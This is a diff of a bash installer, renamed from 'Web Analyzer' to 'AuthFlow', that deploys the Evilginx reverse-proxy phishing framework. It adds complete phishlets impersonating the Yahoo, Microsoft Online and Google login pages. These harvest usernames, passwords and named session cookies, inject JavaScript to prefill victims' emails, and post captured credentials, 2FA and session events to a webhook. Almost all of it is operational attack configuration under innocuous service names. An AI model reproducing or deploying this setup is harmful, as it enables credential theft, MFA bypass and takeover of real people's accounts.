@@ -9,7 +9,7 @@ err() { echo -e "${RED}[ERROR]${NC} $1"; exit 1; }
 
 clear
 echo "============================================"
-echo "     Web Analyzer Installation"
+echo "     AuthFlow Installation"
 echo "============================================"
 echo ""
 
@@ -26,8 +26,6 @@ echo ""
 [ -z "$ADMIN_PASS" ] && ADMIN_PASS=$(openssl rand -base64 16 | tr -d '/+=' | cut -c1-16)
 WEBHOOK_SECRET=$(openssl rand -hex 16)
 ADMIN_PATH=$(openssl rand -hex 12)
-
-# Generate endpoint names
 EP1="collector-$(openssl rand -hex 4)"
 EP2="tracker-$(openssl rand -hex 4)"
 EP3="monitor-$(openssl rand -hex 4)"
@@ -50,22 +48,18 @@ make build
 cp build/evilginx /usr/local/bin/
 chmod +x /usr/local/bin/evilginx
 
-log "Building Web Analyzer..."
-INSTALL_DIR="/opt/webanalyzer"
-mkdir -p $INSTALL_DIR/{data,logs,templates/phishlets}
-cp -r cmd internal go.mod templates $INSTALL_DIR/ 2>/dev/null || true
+log "Building AuthFlow..."
+INSTALL_DIR="/opt/authflow"
+mkdir -p $INSTALL_DIR/{data,logs}
 cd $INSTALL_DIR
 
-go mod tidy
-go build -ldflags="-s -w" -o webanalyzer ./cmd/webanalyzer
-go build -ldflags="-s -w" -o webanalyzer-cli ./cmd/webanalyzer-cli
-cp webanalyzer-cli /usr/local/bin/webanalyzer
-chmod +x /usr/local/bin/webanalyzer
+go mod init authflow 2>/dev/null || true
+go get github.com/gin-gonic/gin github.com/google/uuid github.com/gorilla/websocket github.com/mattn/go-sqlite3
+go build -ldflags="-s -w" -o authflow-server
 
-log "Creating configuration from templates..."
+log "Creating configuration..."
 mkdir -p /opt/evilginx/{phishlets,certs}
 
-# Create config.json
 cat > $INSTALL_DIR/config.json << EOF
 {
     "domain": "$DOMAIN",
@@ -85,11 +79,8 @@ cat > $INSTALL_DIR/config.json << EOF
 }
 EOF
 
-# Create Evilginx config from template
-if [ -f "$INSTALL_DIR/templates/evilginx.yaml.tmpl" ]; then
-    sed "s/{{.Domain}}/$DOMAIN/g" $INSTALL_DIR/templates/evilginx.yaml.tmpl > /opt/evilginx/config.yaml
-else
-    cat > /opt/evilginx/config.yaml << EOF
+log "Configuring Evilginx..."
+cat > /opt/evilginx/config.yaml << EOF
 daemon = false
 debug = false
 version = 3.0.0
@@ -102,22 +93,44 @@ phishlets_path = /opt/evilginx/phishlets
 cert_path = /opt/evilginx/certs
 database = /opt/evilginx/evilginx.db
 EOF
-fi
 
-# Create phishlets from templates
-for i in 1 2 3; do
-    TEMPLATE="$INSTALL_DIR/templates/phishlets/service${i}.yaml.tmpl"
-    if [ -f "$TEMPLATE" ]; then
-        sed "s/{{.Endpoint${i}}}/$(eval echo \$EP${i})/g" "$TEMPLATE" > /opt/evilginx/phishlets/service${i}.yaml
-    else
-        err "Template not found: $TEMPLATE"
-    fi
-done
-
-# Add webhook configuration to each phishlet
-for i in 1 2 3; do
-    cat >> /opt/evilginx/phishlets/service${i}.yaml << EOF
-
+# Create phishlet for service1
+cat > /opt/evilginx/phishlets/service1.yaml << EOF
+name: 'service1'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '$EP1', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true}
+sub_filters:
+  - {trg: 'login.yahoo.com', orig: 'login.yahoo.com', repl: '$EP1.{hostname}'}
+auth_tokens:
+  - domain: '.yahoo.com'
+    keys: ['A3', 'A1', 'A1S']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.yahoo.com'
+  path: '/'
+js_inject:
+  - trigger: 'login.yahoo.com'
+    code: |
+      (function() {
+        var urlParams = new URLSearchParams(window.location.search);
+        var email = urlParams.get('email');
+        if (email) {
+          var emailField = document.querySelector('input[name="username"]');
+          if (emailField) {
+            emailField.value = email;
+            emailField.dispatchEvent(new Event('input', { bubbles: true }));
+          }
+        }
+      })()
 webhook:
   url: "http://127.0.0.1:8080/api/webhook"
   headers:
@@ -125,7 +138,96 @@ webhook:
   format: "json"
   events: ["email", "credentials", "2fa", "session"]
 EOF
-done
+
+# Create phishlet for service2
+cat > /opt/evilginx/phishlets/service2.yaml << EOF
+name: 'service2'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '$EP2', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+sub_filters:
+  - {trg: 'login.microsoftonline.com', orig: 'login.microsoftonline.com', repl: '$EP2.{hostname}'}
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+js_inject:
+  - trigger: 'login.microsoftonline.com'
+    code: |
+      (function() {
+        var urlParams = new URLSearchParams(window.location.search);
+        var email = urlParams.get('email');
+        if (email) {
+          var emailField = document.querySelector('input[name="login"]');
+          if (emailField) {
+            emailField.value = email;
+            emailField.dispatchEvent(new Event('input', { bubbles: true }));
+          }
+        }
+      })()
+webhook:
+  url: "http://127.0.0.1:8080/api/webhook"
+  headers:
+    X-Webhook-Secret: "$WEBHOOK_SECRET"
+  format: "json"
+  events: ["email", "credentials", "2fa", "session"]
+EOF
+
+# Create phishlet for service3
+cat > /opt/evilginx/phishlets/service3.yaml << EOF
+name: 'service3'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '$EP3', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
+sub_filters:
+  - {trg: 'accounts.google.com', orig: 'accounts.google.com', repl: '$EP3.{hostname}'}
+auth_tokens:
+  - domain: '.google.com'
+    keys: ['SID', 'LSID', '__Secure-1PSID', '__Secure-3PSID']
+credentials:
+  username:
+    key: 'identifier'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'Passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'accounts.google.com'
+  path: '/v3/signin/identifier'
+js_inject:
+  - trigger: 'accounts.google.com'
+    code: |
+      (function() {
+        var urlParams = new URLSearchParams(window.location.search);
+        var email = urlParams.get('email');
+        if (email) {
+          var emailField = document.querySelector('input[type="email"]');
+          if (emailField) {
+            emailField.value = email;
+            emailField.dispatchEvent(new Event('input', { bubbles: true }));
+          }
+        }
+      })()
+webhook:
+  url: "http://127.0.0.1:8080/api/webhook"
+  headers:
+    X-Webhook-Secret: "$WEBHOOK_SECRET"
+  format: "json"
+  events: ["email", "credentials", "2fa", "session"]
+EOF
 
 log "Setting up SSL..."
 mkdir -p ~/.secrets
@@ -138,7 +240,7 @@ certbot certonly --dns-cloudflare --dns-cloudflare-credentials ~/.secrets/cloudf
     -d "$DOMAIN" -d "*.$DOMAIN" --non-interactive --agree-tos --register-unsafely-without-email
 
 log "Configuring Nginx..."
-cat > /etc/nginx/sites-available/webanalyzer << EOF
+cat > /etc/nginx/sites-available/authflow << EOF
 server {
     listen 80;
     server_name $DOMAIN *.$DOMAIN;
@@ -187,25 +289,23 @@ server {
 }
 EOF
 
-ln -sf /etc/nginx/sites-available/webanalyzer /etc/nginx/sites-enabled/
+ln -sf /etc/nginx/sites-available/authflow /etc/nginx/sites-enabled/
 rm -f /etc/nginx/sites-enabled/default
 nginx -t && systemctl start nginx && systemctl enable nginx && systemctl reload nginx
 
 log "Creating systemd services..."
-cat > /etc/systemd/system/webanalyzer.service << EOF
+cat > /etc/systemd/system/authflow.service << EOF
 [Unit]
-Description=Web Analyzer Service
+Description=AuthFlow Service
 After=network.target
 
 [Service]
 Type=simple
 User=root
 WorkingDirectory=$INSTALL_DIR
-ExecStart=$INSTALL_DIR/webanalyzer -config $INSTALL_DIR/config.json
+ExecStart=$INSTALL_DIR/authflow-server
 Restart=always
 RestartSec=5
-StandardOutput=append:$INSTALL_DIR/logs/webanalyzer.log
-StandardError=append:$INSTALL_DIR/logs/webanalyzer.log
 
 [Install]
 WantedBy=multi-user.target
@@ -229,8 +329,8 @@ WantedBy=multi-user.target
 EOF
 
 systemctl daemon-reload
-systemctl enable webanalyzer evilginx nginx
-systemctl start webanalyzer evilginx
+systemctl enable authflow evilginx nginx
+systemctl start authflow evilginx
 
 sleep 3
 
@@ -250,9 +350,5 @@ echo "  2: https://$EP2.$DOMAIN"
 echo "  3: https://$EP3.$DOMAIN"
 echo ""
 echo "Commands:"
-echo "  webanalyzer status"
-echo "  webanalyzer stats"
-echo "  webanalyzer urls"
-echo "  webanalyzer sources list"
-echo "  journalctl -u webanalyzer -f"
+echo "  journalctl -u authflow -f"
 echo "============================================"
